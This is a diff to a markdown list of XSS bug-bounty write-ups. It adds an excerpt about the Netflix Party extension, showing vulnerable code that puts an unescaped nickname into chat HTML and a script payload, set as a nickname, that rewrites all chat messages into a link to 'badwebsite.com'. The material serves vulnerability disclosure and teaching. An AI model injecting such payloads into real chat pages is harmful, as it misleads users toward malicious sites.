@@ -128,6 +128,42 @@ So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind X
 > 
 - [Researching Polymorphic Images for XSS on Google Scholar](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
 - [Netflix Party Simple XSS](https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18)
+
+  *Vulnerability*
+  After looking around around at the JavaScript of the extension, I spot the vulnerable code in the addMessage() function:
+  >
+  >  var addMessage = function(message) {
+  > ...
+  > var nicknameMessage = jQuery(`
+  >  <div class="msg-container">
+  >    ...
+  >    <h3>${userNickname}</h3>
+  >    <p>${message.body.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p>
+  >    ....
+  >  </div>`).appendTo(jQuery('#chat-history')).data('permId', message.permId).data('userIcon', userIcon).data('userNickname', userNickname);
+  > ...
+  > }
+  >
+  
+  The developers were clever enough to escape the input string for messagevariable however, the userNickname variable was inserted into the HTML without any filtering, thus creating the XSS vulnerability as any HTML tags will be parsed by the browser.
+  
+  *Exploits*
+  An XSS vulnerability allows an attacker to inject HTML and also execute arbitrary JavaScript. Here are a few examples of possible attacks I could think of.
+  
+  *Change chat history*
+  Starting with a fun, harmless one. You can change the messages and usernames of all the party member with the below payload by setting it as your nickname.
+  >
+  > <script>
+  > for (i = 0; i < document.querySelector("#chat-history").children.length; i++) {
+  >      document.querySelector("#chat-history")
+  >        .children[i]
+  >        .children[1]
+  >        .children[1]
+  >        .innerHTML = '<a href="https://badwebsite.com">click me!</a>';
+  > }
+  > </script>
+  >
+
 - [Stored XSS in google nest](https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68)
 - [Self XSS to persistent XSS on login portal](https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0)
 - [Universal XSS affecting Firefox ](https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html)
